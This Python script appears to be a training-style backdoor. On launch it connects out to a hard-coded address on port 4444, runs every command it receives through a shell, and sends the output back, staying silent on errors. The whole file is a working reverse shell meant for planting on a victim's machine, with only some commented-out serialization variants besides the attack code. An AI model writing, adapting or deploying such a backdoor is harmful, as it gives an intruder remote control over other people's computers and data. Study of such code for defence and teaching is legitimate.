import socket, subprocess,json
import sys


class Backdoor:
    def __init__(self, target_ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((target_ip, port)) #target ip and the port

    def reliable_send(self, data):
        # json_data = json.dumps(data)
        # self.connection.send(json_data.encode('utf-8'))

        self.connection.sendall(data)

    

    def reliable_receive(self):
        # json_data = b""
        # json_data = json_data + self.connection.recv(1024)
        data = self.connection.recv(1024)
        return data.decode('utf-8')

    # def reliable_send(self,data):
    #     en_json_data = json.dumps(data).encode('utf-8')
    #     self.connection.send(en_json_data)
    #
    # def reliable_receive(self):
    #     json_data = b""
    #     json_data = json_data + self.connection.recv(1024)
    #     return json.loads(json_data.decode('utf-8'))
    #

    # def reliable_receive(self):
        # json_data = b""
        # while True:
        #     try:
        #         json_data = json_data + self.connection.recv(1024)
        #         return json.loads(json_data.decode('utf-8'))
        #     except ValueError:
        #         continue
    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.reliable_receive()
            if command == "exit":
                self.connection.close()
                exit()
            rs = self.execute_system_command(command)
            self.reliable_send(rs)
try:
    my_backdoor = Backdoor("192.168.175.139",4444)
    my_backdoor.run()
except Exception:
    sys.exit()